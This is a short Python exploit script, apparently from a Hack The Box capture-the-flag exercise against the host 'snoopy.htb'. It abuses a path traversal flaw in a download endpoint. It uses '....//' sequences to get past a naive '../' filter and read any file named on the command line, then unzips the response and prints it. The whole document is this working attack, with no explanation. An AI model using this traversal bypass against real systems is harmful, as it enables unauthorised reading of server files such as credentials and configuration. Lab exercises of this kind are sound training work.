#!/usr/bin/env python3
import requests
import sys
import zipfile
import io

archive = f"press_package/{sys.argv[1]}"
file = f"....//....//....//....//....//....//....//{sys.argv[1]}"
payload = {"file":file}
r = requests.get('http://snoopy.htb/download', params=payload)
try:
    zip_file = zipfile.ZipFile(io.BytesIO(r.content))
    file_read = zip_file.read(archive)
    print(file_read.decode('ascii'))
except:
    print(f"{sys.argv[1]}: File Not Found!")
